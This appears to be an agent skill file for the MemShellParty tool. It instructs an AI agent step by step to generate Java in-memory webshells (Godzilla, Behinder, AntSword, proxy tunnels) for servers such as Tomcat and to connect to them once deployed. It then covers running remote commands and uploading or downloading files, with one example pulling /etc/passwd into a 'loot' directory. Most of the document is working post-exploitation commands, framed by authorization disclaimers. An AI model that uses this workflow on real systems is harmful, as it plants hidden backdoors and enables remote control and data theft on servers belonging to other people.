---
name: memshell-party
description: Use the memparty CLI or MemShellParty MCP tools for authorized Java memory-shell generation, middleware probes, shell connection checks, command execution, file transfer, and site-profile-based custom shells. For security testing, red-team engagements, or research only.
---

# MemShellParty

Generate and operate Java memory shells through MemShellParty. Use only on systems the user owns or has explicitly authorized for testing.

## Choose the interface

- **CLI**: `memparty <command> [flags]`, or `npx memshell-party-cli <command>`.
- **MCP**: use the corresponding tool when the `memshell-party` server is connected. Its arguments mirror the CLI.

Prefer `--json` for machine-readable results. Use `memparty <command> --help` or the MCP schema for the installed version's exact flags; do not invent options.

Read a reference only when the task needs it:

- [Generation and advanced options](references/generation.md): packer selection, plugins, obfuscation, Agent arguments, and bytecode tools.
- [Probes](references/probes.md): middleware/JDK fingerprinting and response wrappers.
- [Mimic custom shells](references/mimic.md): required workflow for `profile`, `custom build`, and `-t mimic`.
- [MCP reference](references/mcp.md): tool names and important argument mappings.

## 1. Discover backend options

Check reachability and enumerate values instead of guessing names:

```bash
memparty version
memparty config servers
memparty config tools Tomcat   # replace with the target server
memparty config packers
memparty config tool-configs   # tool-specific fields
```

Every generated shell needs **server → shell tool → shell type → packer**. Not every combination is valid; use the discovered values. On v3, packer parents such as `Base64` are categories: select a concrete variant such as `DefaultBase64`.

Common tools:

| Tool | Purpose |
|------|---------|
| `Godzilla` / `GodzillaSession` | Encrypted Godzilla-compatible shell |
| `Behinder` | Encrypted Behinder shell |
| `AntSword` | AntSword-compatible shell |
| `Command` | Single-command execution |
| `Suo5` / `NeoreGeorg` / `Proxy` | Proxy or tunnel |
| `Custom` | User-supplied `.class` bytecode |

Match `Jakarta*` shell types to Tomcat 10+ / Spring Boot 3; use non-prefixed types for Tomcat 9- / Spring Boot 2. Set `--jdk` to a version supported by the target. `Agent*` types need an `AgentJar*` packer and JVM attach, not ordinary class-byte delivery.

If the middleware is unknown, follow the [probe guide](references/probes.md) before choosing a server.

## 2. Generate and retain connection details

```bash
memparty gen -s Tomcat -t Godzilla -y Listener -p DefaultBase64 \
  --godzilla-pass <pass> --godzilla-key <key> -o shell.class --json
```

Common credential flags are `--godzilla-pass` / `--godzilla-key`, `--behinder-pass`, and `--antsword-pass`. Use `--shell-class-file` for `Custom`.

By default the payload goes to stdout. `-o` writes it to a file, decoding Base64 automatically for `.class` and `.jar`; combine it with `--json` to retain metadata. MCP generation tools use `outputFile` for the same purpose.

Save the generated class names, credentials, and `shellToolConfig.headerName` / `headerValue`. The auth header is required for later connections. The user is responsible for deploying the generated payload; do not claim it is deployed or reachable until a connection check succeeds.

For plugins, obfuscation, Agent attach arguments, or bytecode transformations, read the [generation reference](references/generation.md).

## 3. Connect and save the target

After deployment, perform the real protocol handshake:

```bash
memparty connect -u <shell-url> -t godzilla --pass <pass> --key <key> \
  --header-name <name-from-gen> --header-value <value-from-gen>
```

Use `-t behinder --pass <pass>` for Behinder, and `-t suo5` for suo5. A `GodzillaSession` shell also connects with `-t godzilla`. For self-signed TLS use `--insecure`; add repeatable `-H "Name: value"` for other required request headers.

Godzilla WebSocket/RawWebSocket uses `ws://` or `wss://`. Tomcat Upgrade uses HTTP plus `--upgrade-protocol <fully-qualified-shell-class-name>`.

Save a working target to avoid repeating credentials:

```bash
memparty save web1/tomcat -u <shell-url> -t godzilla --pass <pass> --key <key> \
  --header-name <name> --header-value <value> --category test
memparty list
```

Successful connection, execution, and transfer operations may also auto-save targets. Use `memparty list` to get the actual name.

## 4. Execute commands or transfer files

```bash
memparty exec web1/tomcat --cmd "whoami" --json
memparty upload web1/tomcat ./local.txt /tmp/remote.txt
memparty download web1/tomcat /etc/passwd -o loot/passwd
```

Without a saved target, pass the same URL, protocol, credentials, and auth header used by `connect`. Command execution and transfer support Godzilla and Behinder; mimic supports execution only.

- Godzilla detects the remote OS for `exec`; `--os windows|linux` skips detection.
- Download does not overwrite a local file without `--force`. Upload overwrites the remote path and may leave a partial file on failure.
- Transfers are chunked and verified. Behinder uploads are limited to 64 MiB; Godzilla transfers and Behinder downloads are limited to 2 GiB.
- For non-ASCII Godzilla paths on older Chinese Windows JDKs, use `--remote-charset GBK`.

## 5. Review history

Operations are recorded in `~/.memparty/operations.jsonl`, excluding credentials, payload bytes, and file contents:

```bash
memparty log --category exec --target web1
```

Saved targets are stored in `~/.memparty/targets.json`.

## Backend selection

The default backend is `https://party.mem.mk`. For real testing, use a self-hosted backend rather than sending payloads to a public service:

```bash
memparty --api http://127.0.0.1:8080 gen
# or
export MEMPARTY_API_URL=http://127.0.0.1:8080
```

Priority: `--api` > `MEMPARTY_API_URL` > `~/.mempartyrc` > default backend.
